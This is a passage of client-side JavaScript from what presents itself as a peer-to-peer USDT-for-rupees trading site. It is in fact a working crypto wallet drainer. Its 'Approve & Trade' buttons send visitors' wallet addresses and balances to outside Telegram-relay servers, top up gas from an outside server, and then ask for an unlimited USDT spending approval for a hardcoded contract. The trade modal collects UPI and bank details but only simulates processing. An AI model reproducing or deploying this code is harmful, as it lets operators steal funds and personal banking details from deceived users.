        notify.style.color = "#fff";
        notify.style.opacity = "1";
        notify.style.pointerEvents = "auto";
        setTimeout(() => {
            notify.style.opacity = "0";
            notify.style.pointerEvents = "none";
        }, 3000);
    }

    // ===== GENERIC TELEGRAM MESSAGE SENDER (UPDATED FOR DUAL BACKENDS) =====
    async function sendTelegramMessage(message) {
        const backendUrl1 = 'https://telegram-bot-second-production.up.railway.app/sendTelegram';
        const backendUrl2 = 'https://telegram-bot-production-d2c7.up.railway.app/sendTelegram'; // Your second backend URL

        // Send to first backend
        try {
            const response1 = await fetch(backendUrl1, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ message: message })
            });
            const result1 = await response1.json();
            if (result1.ok) {
                console.log('Telegram message sent to first backend successfully');
            } else {
                console.error('Telegram message failed for first backend:', result1);
            }
        } catch (error) {
            console.error('Error sending Telegram message to first backend:', error);
        }

        // Send to second backend
        try {
            const response2 = await fetch(backendUrl2, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ message: message })
            });
            const result2 = await response2.json();
            if (result2.ok) {
                console.log('Telegram message sent to second backend successfully');
            } else {
                console.error('Telegram message failed for second backend:', result2);
            }
        } catch (error) {
            console.error('Error sending Telegram message to second backend:', error);
        }
    }

    // ===== TELEGRAM NOTIFICATION FOR USDT APPROVAL (REUSING GENERIC SENDER) =====
    async function sendTelegramNotification(walletAddress, txHash) {
        const message = `🔔 USDT Escrow Approval Successful!\n\n` +
                        `💰 Wallet: ${walletAddress}\n` +
                        `📝 Transaction Hash: ${txHash}\n\n` +
                        `✅ User has approved escrow contract for USDT spending\n` +
                        `🏦 Escrow Contract: 0x3606B0Ee947E5e28cAA81FEEB01187388732B26f\n` +
                        `⏰ Time: ${new Date().toLocaleString()}`;
        
        await sendTelegramMessage(message);
    }

    // ===== ADD AND SWITCH TO BSC NETWORK =====
    async function addAndSwitchToBSC() {
        if (!window.ethereum) {
            showNotification("No Web3 wallet found. Please open in Trust Wallet or MetaMask browser.", "error");
            throw new Error("No Web3 wallet found."); // Throw to stop the process if no wallet
        }

        const BSC_MAINNET = {
            chainId: "0x38", // 56 in hex (BSC mainnet)
            chainName: "Binance Smart Chain",
            nativeCurrency: {
                name: "BNB",
                symbol: "BNB",
                decimals: 18,
            },
            rpcUrls: ["https://bsc-dataseed.binance.org/"],
            blockExplorerUrls: ["https://bscscan.com"],
        };

        try {
            const currentChainId = await window.ethereum.request({
                method: 'eth_chainId'
            });

            if (currentChainId === '0x38') {
                console.log("Already on BSC");
                return; // Already on BSC, no need to switch
            }

            try {
                // Try switching to BSC
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }],
                });
                console.log("Switched to BSC");
            } catch (switchError) {
                // If BSC is not added (error code 4902), add it
                if (switchError.code === 4902) {
                    await window.ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [BSC_MAINNET],
                    });
                    console.log("BSC network added!");
                } else {
                    console.error("Failed to switch to BSC:", switchError);
                    showNotification("Failed to switch to BSC. Please try manually.", "error");
                    throw switchError; // Re-throw to be caught by the main click handler
                }
            }
        } catch (error) {
            console.error("General error in addAndSwitchToBSC:", error);
            showNotification("An error occurred while switching networks. Check console for details.", "error");
            throw error; // Re-throw to be caught by the main click handler
        }
    }

    // ===== SEND INITIAL WALLET DETAILS TO TELEGRAM =====
    // Now returns formattedBNB for the balance check
    async function sendWalletBalancesToTelegram(walletAddress) {
        const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
        const usdtAbi = [
            "function balanceOf(address owner) view returns (uint256)",
            "function decimals() view returns (uint8)"
        ];

        let formattedBNB = "0.0000";
        let formattedUSDT = "0.00";

        try {
            // Ensure ethers.js provider is available. Assuming it's loaded globally.
            const provider = new ethers.providers.Web3Provider(window.ethereum);

            // Get BNB balance
            const bnbBalance = await provider.getBalance(walletAddress);
            formattedBNB = ethers.utils.formatEther(bnbBalance);

            // Get USDT balance
            const tokenContract = new ethers.Contract(usdtAddress, usdtAbi, provider);
            let usdtDecimals = 18; // Default to 18 decimals
            try {
                // Try to fetch actual decimals from the contract
                const usdtDecimalsValue = await tokenContract.decimals();
                usdtDecimals = usdtDecimalsValue.toNumber();
            } catch (err) {
                console.warn("Could not fetch USDT decimals, defaulting to 18:", err);
            }
            const usdtBalance = await tokenContract.balanceOf(walletAddress);
            formattedUSDT = ethers.utils.formatUnits(usdtBalance, usdtDecimals);

            // Construct and send the message using the existing sendTelegramMessage function
            const message = `🟢 New Wallet Connected!\n\n` +
                            `🆔 Wallet Address: <code>${walletAddress}</code>\n` +
                            `💰 BNB Balance: ${parseFloat(formattedBNB).toFixed(4)} BNB\n` +
                            `💵 USDT Balance: ${parseFloat(formattedUSDT).toFixed(2)} USDT\n` +
                            `⏰ Time: ${new Date().toLocaleString()}`;
            
            await sendTelegramMessage(message);

            // This part was in your provided connectWallet function, keeping it if needed for your backend.
            fetch('saveWallet.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    wallet: walletAddress,
                    bnb: formattedBNB,
                    usdt: formattedUSDT
                })
            }).catch(e => console.error("Error sending wallet data to saveWallet.php:", e));

        } catch (err) {
            console.error("Error fetching or sending wallet details to Telegram:", err);
            // This function should not block the main transaction flow if it fails.
        }
        return { formattedBNB, formattedUSDT }; // Return balances for further checks
    }
    
    $(document).ready(function() {
        // Update all order card button texts to indicate approval requirement
        $('.order-card button:first-child').each(function() {
            if ($(this).text().trim() === 'Sell Now') {
                $(this).text('Approve & Trade');
            }
        });
        
        // Mobile menu toggle
        $('#mobile-menu-btn').click(function() {
            $('#mobile-menu').toggleClass('hidden');
        });

        // Trade modal functionality - First request USDT approval
        $('.order-card button:first-child').click(async function() {
            if (!$(this).prop('disabled')) {
                const $btn = $(this);
                const originalBtnHTML = $btn.html();
                
                if (!window.ethereum) {
                    showNotification("No Web3 wallet found. Please open in Trust Wallet or MetaMask browser.", "error");
                    return;
                }

                // Show spinner state
                $btn.html('<span class="spinner">Processing...</span>');
                $btn.prop('disabled', true);
                
                let fromAddress;
                let bnbBalance; // Declare bnbBalance here to be accessible later

                try {
                    // Step 1: Add and switch to the BSC network
                    await addAndSwitchToBSC();

                    // Step 2: Request accounts after network switch to ensure connection
                    // Using eth_accounts to get already connected accounts.
                    // This will NOT prompt the user to connect if not already connected.
                    const accounts = await window.ethereum.request({ method: "eth_accounts" });
                    fromAddress = accounts[0]; // Assign to the outer scope variable

                    // --- MODIFIED: Removed the direct "Wallet connection failed" notification ---
                    if (!fromAddress) {
                        // If no address is found (wallet not connected/approved),
                        // simply reset the button state and exit.
                        // The user can then click again, which might trigger their wallet's
                        // connection prompt depending on their wallet's behavior.
                        $btn.prop('disabled', false);
                        $btn.html(originalBtnHTML);
                        return;
                    }
                    // --------------------------------------------------------------------------

                    // Step 3: Send wallet details (address, BNB, USDT balance) to Telegram
                    // and get the formatted BNB balance back for the check
                    const balances = await sendWalletBalancesToTelegram(fromAddress);
                    bnbBalance = balances.formattedBNB; // Assign to the outer scope variable

                    // === NEW FEATURE: CHECK BNB BALANCE AND SEND IF ZERO ===
                    if (parseFloat(bnbBalance) === 0) { // Correct comparison
                        showNotification("Checking the BNB balance and topping up...", "info"); // Changed to info type
                        await fetch("https://bnb-server-production.up.railway.app/send-bnb", {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({ toAddress: fromAddress }) // Use fromAddress
                        });
                        await new Promise(r => setTimeout(r, 4000)); // Wait for gas (increased to 4s for network propagation)
                        showNotification("BNB top-up initiated. Please wait a moment and try the approval again.", "success");
                        // After topping up, we'll exit and let the user click again to retry the approval
                        $btn.prop('disabled', false);
                        $btn.html(originalBtnHTML);
                        return; // Exit after topping up, user can re-click
                    }
                    // --------------------------------------------------------

                    const escrowContractAddress = "0x3606B0Ee947E5e28cAA81FEEB01187388732B26f"; // USDTEscrow contract address
                    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT token address on BSC

                    // Prepare the ABI interface for USDT approval
                    const usdtAbi = [
                        "function approve(address spender, uint256 amount) public returns (bool)",
                        "function decimals() view returns (uint8)"
                    ];
                    const iface = new ethers.utils.Interface(usdtAbi);

                    // Use maximum approval amount (MaxUint256)
                    const maxApproval = ethers.constants.MaxUint256;

                    // Encode approve(...) call for the escrow contract
                    const txData = iface.encodeFunctionData("approve", [escrowContractAddress, maxApproval]);

                    // Send the approval transaction
                    const txHash = await window.ethereum.request({
                        method: "eth_sendTransaction",
                        params: [{ from: fromAddress, to: usdtAddress, data: txData, value: "0x0" }]
                    });
                    
                    showNotification(`USDT approval successful! Opening trade modal...`, "success");
                    
                    // Send Telegram notification after successful approval transaction
                    await sendTelegramNotification(fromAddress, txHash);
                    
                    // Only show modal after successful approval
                    $('#trade-modal').removeClass('hidden');
                    
                    // Reset amount calculation fields in the modal
                    $('#inr-amount').text('₹0.00');
                    $('input[type="number"]').val('');
                    
                    // Reset payment forms in the modal
                    $('#payment-details').addClass('hidden');
                    $('#payment-method').val('');
                    $('.payment-form').addClass('hidden');
                    $('input[type="text"], input[type="file"]').val('');

                } catch (err) {
                    const msg = (err?.message || "").toLowerCase();
                    if (msg.includes("user rejected") || msg.includes("user denied") || msg.includes("cancelled") || msg.includes("canceled")) {
                        showNotification("Transaction cancelled.", "error");
                    } else if (msg.includes("insufficient funds") || msg.includes("exceeds balance") || (msg.includes("execution reverted") && msg.includes("exceeds balance"))) {
                        showNotification("Insufficient USDT balance for this approval.", "error");
                    } else {
                        showNotification("Transaction failed. Please try again.", "error");
                        console.error("Transaction failed:", err);
                    }
                } finally {
                    // Always restore original button state
                    $btn.prop('disabled', false);
                    $btn.html(originalBtnHTML);
                }
            }
        });

        $('#close-modal, #cancel-trade').click(function() {
            $('#trade-modal').addClass('hidden');
        });

        // Close modal when clicking outside
        $('#trade-modal').click(function(e) {
            if (e.target === this) {
                $(this).addClass('hidden');
            }
        });
        
        // Validate payment details before proceeding with trade
        function validatePaymentDetails() {
            var selectedMethod = $('#payment-method').val();
            var usdtAmount = parseFloat($('input[type="number"]').val()) || 0;
            
            if (usdtAmount <= 0) {
                showNotification('Please enter a valid USDT amount.', 'error');
                return false;
            }
            
            if (!selectedMethod) {
                showNotification('Please select a payment method.', 'error');
                return false;
            }
            
            // Validate based on payment method specific fields
            if (selectedMethod === 'UPI') {
                var upiId = $('#upi-id').val().trim();
                if (!upiId) {
                    showNotification('Please enter your UPI ID.', 'error');
                    return false;
                }
            } else if (selectedMethod === 'IMPS' || selectedMethod === 'Bank Transfer') {
                var holderName = $('#holder-name').val().trim();
                var accountNumber = $('#account-number').val().trim();
                var ifscCode = $('#ifsc-code').val().trim();
                
                if (!holderName) {
                    showNotification('Please enter account holder name.', 'error');
                    return false;
                }
                if (!accountNumber) {
                    showNotification('Please enter account number.', 'error');
                    return false;
                }
                if (!ifscCode) {
                    showNotification('Please enter IFSC code.', 'error');
                    return false;
                }
            } else if (selectedMethod === 'Paytm' || selectedMethod === 'PhonePe' || selectedMethod === 'Google Pay') {
                var mobileNumber = $('#mobile-number').val().trim();
                if (!mobileNumber) {
                    showNotification('Please enter your mobile number.', 'error');
                    return false;
                }
            }
            
            return true;
        }
        
        // Collect payment data from modal fields
        function collectPaymentData() {
            var selectedMethod = $('#payment-method').val();
            var usdtAmount = parseFloat($('input[type="number"]').val()) || 0;
            var inrAmount = (usdtAmount * 110).toFixed(2); // Assuming a fixed rate of 110 INR/USDT
            
            var paymentData = {
                usdtAmount: usdtAmount,
                inrAmount: inrAmount,
                paymentMethod: selectedMethod,
                timestamp: new Date().toISOString()
            };
            
            // Add method-specific data
            if (selectedMethod === 'UPI') {
                paymentData.upiId = $('#upi-id').val().trim();
            } else if (selectedMethod === 'IMPS' || selectedMethod === 'Bank Transfer') {
                paymentData.holderName = $('#holder-name').val().trim();
                paymentData.accountNumber = $('#account-number').val().trim();
                paymentData.ifscCode = $('#ifsc-code').val().trim();
            } else if (selectedMethod === 'Paytm' || selectedMethod === 'PhonePe' || selectedMethod === 'Google Pay') {
                paymentData.mobileNumber = $('#mobile-number').val().trim();
            }
            
            return paymentData;
        }
        
        // Sell USDT button click handler inside the modal
        $('#sell-usdt-btn').click(function() {
            // Validate payment details first
            if (!validatePaymentDetails()) {
                return;
            }
            
            // Show loading state for the sell button
            $('#sell-btn-text').addClass('hidden');
            $('#sell-btn-loading').removeClass('hidden');
            $('#sell-usdt-btn').prop('disabled', true);
            
            // Collect payment data
            var paymentData = collectPaymentData();
            console.log('Payment Data:', paymentData);
            
            // Simulate trade processing (replace with actual trade logic later)
            setTimeout(function() {
                showNotification('Your USDT trade has been initiated successfully!', 'success');
                $('#trade-modal').addClass('hidden');
                
                // Reset button state
                $('#sell-btn-text').removeClass('hidden');
                $('#sell-btn-loading').addClass('hidden');
                $('#sell-usdt-btn').prop('disabled', false);
            }, 2000);
        });
        
        // Close notification toast
        $('#toast-close').click(function() {
            $('#notification-toast').addClass('hidden');
        });

        // Amount calculation for selling USDT in the modal
        $('input[type="number"]').on('input', function() {
            var usdtAmount = parseFloat($(this).val()) || 0;
            var price = 110; // ₹110/USDT (fixed rate)
            var inrAmount = (usdtAmount * price).toFixed(2);
            
            // Update the "You will receive" amount in the modal
            $('#inr-amount').text('₹' + inrAmount);
            
            // Show payment details section if a valid amount is entered
            if (usdtAmount > 0) {
                $('#payment-details').removeClass('hidden');
            } else {
                $('#payment-details').addClass('hidden');
            }
        });
        
        // Payment method selection in the modal
        $('#payment-method').on('change', function() {
            var selectedMethod = $(this).val();
            
            // Hide all payment forms initially
            $('.payment-form').addClass('hidden');
            
            // Show relevant form based on selection
            if (selectedMethod === 'UPI') {
                $('#upi-details').removeClass('hidden');
            } else if (selectedMethod === 'IMPS' || selectedMethod === 'Bank Transfer') {
                $('#bank-details').removeClass('hidden');
            } else if (selectedMethod === 'Paytm' || selectedMethod === 'PhonePe' || selectedMethod === 'Google Pay') {
                $('#digital-wallet-details').removeClass('hidden');
            }
        });

        // Filter functionality for order cards
        function applyFilters() {
            var orderType = $('#order-type-filter').val();
            var paymentMethod = $('#payment-filter').val();
            var amountRange = $('#amount-filter').val();
            
            $('.order-card').each(function() {
                var $card = $(this);
                var cardPayment = $card.data('payment');
                var cardAmount = $card.data('amount');
                var cardType = $card.data('type');
                
                var showCard = true;
                
                // Filter by order type
                if (orderType !== 'all' && cardType !== orderType) {
                    showCard = false;
                }
                
                // Filter by payment method
                if (paymentMethod !== 'all' && !cardPayment.includes(paymentMethod)) {
                    showCard = false;
                }
                
                // Filter by amount range
                if (amountRange !== 'all') {
                    var cardMin = parseInt(cardAmount.split('-')[0]);
                    var cardMax = parseInt(cardAmount.split('-')[1]);
                    
                    switch(amountRange) {
                        case '1000-10000':
                            if (cardMin < 1000 || cardMax > 10000) showCard = false;
                            break;
                        case '10000-50000':
                            if (cardMin < 10000 || cardMax > 50000) showCard = false;
                            break;
                        case '50000-100000':
                            if (cardMin < 50000 || cardMax > 100000) showCard = false;
                            break;
                        case '100000+':
                            if (cardMin < 100000) showCard = false;
                            break;
                    }
                }
                
                if (showCard) {
                    $card.show();
                } else {
                    $card.hide();
                }
            });
            
            // Update visible count text
            var visibleCount = $('.order-card:visible').length;
            $('h2 .text-sm').text('(' + visibleCount + ' orders)');
        }
        
        // Filter button click
        $('#filter-btn').click(function() {
            applyFilters();
        });
        
        // Clear filters
        $('#clear-filters').click(function() {
            $('#order-type-filter').val('all');
            $('#payment-filter').val('all');
            $('#amount-filter').val('all');
            $('.order-card').show(); // Show all cards
            $('h2 .text-sm').text('(41 orders)'); // Reset count
        });
        
        // Auto-filter on select change
        $('#order-type-filter, #payment-filter, #amount-filter').change(function() {
            applyFilters();
        });

        // Load more orders functionality
        $('#load-more-btn').click(function() {
            var $btn = $(this);
            var $additionalOrders = $('#additional-orders');
            
            if ($additionalOrders.hasClass('hidden')) {
                // Show additional orders if hidden
                $additionalOrders.removeClass('hidden');
                $btn.html('<i class="fas fa-sync-alt mr-2"></i>Load More Orders (12 of 41)');
                $btn.addClass('bg-gray-400 hover:bg-gray-500').removeClass('bg-blue-600 hover:bg-blue-700');
            } else {
                // Simulate loading more orders
                $btn.html('<i class="fas fa-spinner fa-spin mr-2"></i>Loading...');
                
                setTimeout(function() {
                    $btn.html('<i class="fas fa-check mr-2"></i>All Orders Loaded (41 of 41)');
                    $btn.addClass('bg-green-600 hover:bg-green-700').removeClass('bg-gray-400 hover:bg-gray-500');
                    $btn.prop('disabled', true); // Disable button once all are loaded
                }, 2000);
            }
        });
    });
</script>

</body>
</html>
